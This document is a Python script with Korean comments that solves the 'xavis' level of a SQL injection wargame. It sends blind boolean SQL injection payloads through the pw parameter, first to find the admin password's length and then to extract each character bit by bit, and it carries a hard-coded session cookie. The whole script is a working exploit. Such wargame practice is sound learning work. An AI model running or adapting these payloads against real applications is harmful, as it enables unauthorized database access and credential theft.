from requests import get  # request에 있는 get을 가져왔다.

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php" # 자신의 문제 url을 가져온다.
cookie = dict(PHPSESSID="40vlbbgl5dklkul1tvp8dfqn3s") # 자신의 쿠키값을 가져온다.
length = 0
password = ''

print("### find for pw length ###")
while(True) :
    param = "?pw=1232%27%20or%20length(pw)>"+str(length)+"%23"
    new_url = url+param
    rec = get(new_url,cookies=cookie)

    if(rec.text.find("Hello admin") == -1): # Hello admin이 나오지 않는다면
        print("find pw length : "+str(length))
        break
    
    print("fail to find pw length : "+str(length))
    length+=1

print("### find for actual password ###")
for i in range(1,length+1) :
    temp_bit=''
    for j in range(1,17) :
        param = "?pw=1234%27%20or%20id=%27admin%27%20and%20substr(lpad(bin(ord(substr(pw,"+str(i)+",1))),16,0),"+str(j)+",1)=1--%20"
        new_url = url+param
        rec = get(new_url,cookies=cookie)

        if(rec.text.find("Hello admin")>=0) : # Hello admin가 나오면 
            print("add bit 1 for ",i,"'s letters")
            temp_bit+="1"
        else :
            print("add bit 0 for ",i,"'s letters")
            temp_bit+="0"
    
    password += chr(int(temp_bit,base=2)) # chr은 정수형 ascii값을 문자열로 바꿔주는 것이고, int(temp_bitbase=2)는 temp_bit를 2진수에서 10진수로 바꾼다는 의미임. base=2가 2진수를 의미함.
    
    print("current password",chr(int(temp_bit,base=2)),hex(int(temp_bit,base=2)))

print("Found password :",password)